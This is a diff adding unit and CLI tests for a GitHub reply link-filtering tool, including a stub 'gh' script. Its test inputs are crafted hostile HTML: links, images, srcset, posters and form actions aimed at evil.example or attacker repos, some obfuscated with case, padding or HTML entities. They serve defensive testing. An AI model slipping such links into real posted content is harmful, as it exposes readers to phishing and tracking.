+            'data-canonical-src="https://raw.githubusercontent.com/Dv2Corn/still-ui/main/a.png" style="max-width:100%"></a>'
+            '<img src="https://xtls.github.io/logo.png" srcset="https://xtls.github.io/a.png 1x, /Dv2Corn/still-ui/raw/main/b.png 2x">'
+            "</p>"
+        )
+        self.assertEqual(self.failures(rendered), 0)
+
+    def test_each_kind_of_bad_link_counts(self):
+        cases = {
+            '<a href="https://evil.example/">x</a>': 1,
+            '<a href="/attacker/repo">x</a>': 1,
+            '<a href="../../../attacker/repo">x</a>': 1,
+            f'<a href="https://github.com/Dv2Corn/still-ui/commit/{FORK}">x</a>': 1,
+            '<a href="https://github.com/Dv2Corn/still-ui/blob/0123abc/x">x</a>': 1,
+            '<a href="https://github.com/attacker">@attacker</a>': 1,  # not a mention link
+            '<a class="user-mention" href="https://github.com/attacker/repo">@x</a>': 1,
+            '<a href="mailto:a@evil.example">a</a>': 1,
+            '<img src="https://camo.githubusercontent.com/aa">': 1,  # no data-canonical-src
+            '<img src="https://camo.githubusercontent.com/aa" data-canonical-src="https://evil.example/a.png">': 2,
+            '<a href="https://camo.githubusercontent.com/zz"><img src="https://camo.githubusercontent.com/aa" '
+            'data-canonical-src="https://raw.githubusercontent.com/Dv2Corn/still-ui/main/a.png"></a>': 1,
+            '<img srcset="https://xtls.github.io/a.png 1x, https://evil.example/b.png 2x">': 1,
+            '<video poster="//evil.example/p.png"></video>': 1,
+            '<form action="https://evil.example/"><button formaction="/attacker/r">x</button></form>': 2,
+            '<blockquote cite="https://evil.example/"></blockquote>': 1,
+            '<a href="HTTPS://EVIL.EXAMPLE">x</a><a href=" https://evil.example ">y</a>': 2,
+            '<a href="https://evil&#46;example/">x</a>': 1,
+        }
+        for rendered, expected in cases.items():
+            self.assertEqual(self.failures(rendered), expected, rendered)
+
+    def test_fallback_renders_no_link(self):
+        text = "a [x](https://evil.example)\n~~~~~~~ b\n```\n<a href=x>"
+        out = plain_fallback(text)
+        self.assertTrue(out.startswith(FALLBACK_NOTE + "\n\n~~~~~~~~\n"), out)
+        self.assertTrue(out.endswith("\n<a href=x>\n~~~~~~~~\n"), out)
+        self.assertEqual(plain_fallback("x"), FALLBACK_NOTE + "\n\n~~~~\nx\n~~~~\n")
+
+
+FAKE_GH = r"""#!/bin/sh
+# Answers `gh api PATH --jq EXPR` from $FAKE_API/<PATH with / as _>; a missing
+# file is a 404. `gh api markdown` gets the text on stdin.
+echo "$*" >> "$FAKE_API/calls.log"
+[ "$2" = markdown ] && cat > "$FAKE_API/markdown.in"
+f="$FAKE_API/$(printf '%s' "$2" | tr '/' '_')"
+[ "$1" = api ] && [ -f "$f" ] || { echo "gh: Not Found (HTTP 404)" >&2; exit 1; }
+cat "$f"
+"""
+
+
+class CliTest(unittest.TestCase):
+    def run_cli(self, text, *args, api=None):
+        with tempfile.TemporaryDirectory() as d:
+            src, dst = Path(d) / "in.md", Path(d) / "out.md"
+            src.write_bytes(text.encode())
+            (Path(d) / "api").mkdir()
+            for path, answer in (api or {}).items():
+                (Path(d) / "api" / path.replace("/", "_")).write_text(answer + "\n")
+            gh = Path(d) / "gh"
+            gh.write_text(FAKE_GH)
+            gh.chmod(0o755)
+            env = dict(os.environ, PATH=f"{d}:{os.environ['PATH']}", FAKE_API=str(Path(d) / "api"))
+            proc = subprocess.run(
+                [sys.executable, "-I", str(SCRIPT), *args, str(src), str(dst)], capture_output=True, text=True, env=env
+            )
+            calls = (Path(d) / "api" / "calls.log").read_text() if (Path(d) / "api" / "calls.log").exists() else ""
+            self.calls = calls.splitlines()
+            return proc, dst.read_bytes().decode()
+
+    def test_refs_are_checked_with_the_api_and_fail_closed(self):
+        text = (
+            "https://github.com/o/r/blob/main/a.go "
+            f"https://github.com/o/r/blob/{GOOD}/b.go "
+            f"https://github.com/o/r/blob/{FORK}/c.go "
+            "https://github.com/o/r/tree/v1 "
+            "https://github.com/o/r/tree/v2 "
+            "https://github.com/XTLS/Xray-core/blob/main/d.go\n"
+        )
+        api = {
+            "repos/o/r": "main",
+            f"repos/o/r/compare/main...{GOOD}": "behind",
+            f"repos/o/r/compare/main...{FORK}": "diverged",
+            "repos/o/r/git/ref/tags/v1": "refs/tags/v1",
+        }
+        proc, out = self.run_cli(text, "--repo", "o/r", "--base", "https://github.com/o/r/issues/7", api=api)
+        self.assertEqual(proc.returncode, 0, proc.stderr)
+        self.assertEqual(
+            out,
+            f"https://github.com/o/r/blob/main/a.go https://github.com/o/r/blob/{GOOD}/b.go {REMOVED} "
+            f"https://github.com/o/r/tree/v1 {REMOVED} {REMOVED}\n",
+        )
+        self.assertIn("Removed 3 link(s)", proc.stdout)
+        # One lookup of the default branch, whatever the number of links.
+        self.assertEqual(sum(c == "api repos/o/r --jq .default_branch" for c in self.calls), 1)
+
+    def test_gate_posts_the_text_when_the_rendering_is_clean(self):
+        api = {"markdown": '<p>Fixed in <a href="https://github.com/o/r/issues/2">#2</a>.</p>'}
+        proc, out = self.run_cli("Fixed in #2.\n", "--gate", "--repo", "o/r", "--base", "https://github.com/o/r/issues/7", api=api)
+        self.assertEqual((proc.returncode, out, proc.stdout), (0, "Fixed in #2.\n", ""))
+        self.assertIn("api markdown -X POST -F text=@- -f mode=gfm -f context=o/r", self.calls)
+
+    def test_gate_falls_back_when_a_rendered_link_fails(self):
+        api = {"markdown": '<p><a href="https://github.com/attacker/repo">x</a></p>'}
+        proc, out = self.run_cli("x\n", "--gate", "--repo", "o/r", "--base", "https://github.com/o/r/issues/7", api=api)
+        self.assertEqual(out, FALLBACK_NOTE + "\n\n~~~~\nx\n~~~~\n")
+        self.assertIn("::warning::1 link(s) in the rendered reply", proc.stdout)
+        self.assertNotIn("attacker", proc.stdout)
+
+    def test_gate_falls_back_when_rendering_fails(self):
+        proc, out = self.run_cli("x\n", "--gate", "--no-filter", "--repo", "o/r", "--base", "https://github.com/o/r/pull/7")
+        self.assertEqual(out, FALLBACK_NOTE + "\n\n~~~~\nx\n~~~~\n")
+        self.assertIn("Could not render", proc.stdout)
+
+    def test_too_complex_input_is_posted_as_plain_text(self):
+        text = ('<x "q" ' * 300 + ">\n\n") * 10
+        proc, out = self.run_cli(text)
+        self.assertEqual(out, FALLBACK_NOTE + "\n\n~~~~\n" + text + "~~~~\n")
+        self.assertIn("too complex", proc.stdout)
+
+    def test_author_may_be_mentioned(self):
+        proc, out = self.run_cli("@someone @o @x\n", "--repo", "o/r", "--author", "someone")
+        self.assertEqual(out, "@someone @o `@x`\n")
+        self.assertIn("::notice::Put 1 reference(s)", proc.stdout)
+
+    def test_no_filter_skips_the_text_pass(self):
+        api = {"markdown": "<p>x</p>"}
+        proc, out = self.run_cli("https://evil.example\n", "--gate", "--no-filter", api=api)
+        # The (crafted) rendering shows no link, so the text is posted as it is.
+        self.assertEqual(out, "https://evil.example\n")
+
+    def test_the_reviewed_head_needs_no_api(self):
+        proc, out = self.run_cli(
+            f"https://github.com/o/r/blob/{FORK}/x.go", "--repo", "o/r", "--base", "https://github.com/o/r/pull/9",
+            "--head-sha", FORK,
+        )
+        self.assertEqual((proc.returncode, out, self.calls), (0, f"https://github.com/o/r/blob/{FORK}/x.go", []))
+
+    def test_warns_with_the_count_and_never_the_url(self):
+        proc, out = self.run_cli("a https://evil.example/x b [c](https://evil.example/y)\n")
+        self.assertEqual(proc.returncode, 0, proc.stderr)
+        self.assertEqual(out, f"a {REMOVED} b c {REMOVED}\n")
+        self.assertEqual(proc.stdout.count("::warning::"), 1)
+        self.assertIn("Removed 2 link(s)", proc.stdout)
+        self.assertNotIn("evil", proc.stdout + proc.stderr)
+
+    def test_silent_when_nothing_is_removed(self):
+        proc, out = self.run_cli("fine https://github.com/Dv2Corn/still-ui\r\n")
+        self.assertEqual((proc.returncode, proc.stdout, out), (0, "", "fine https://github.com/Dv2Corn/still-ui\r\n"))
+
+
+if __name__ == "__main__":
+    unittest.main()
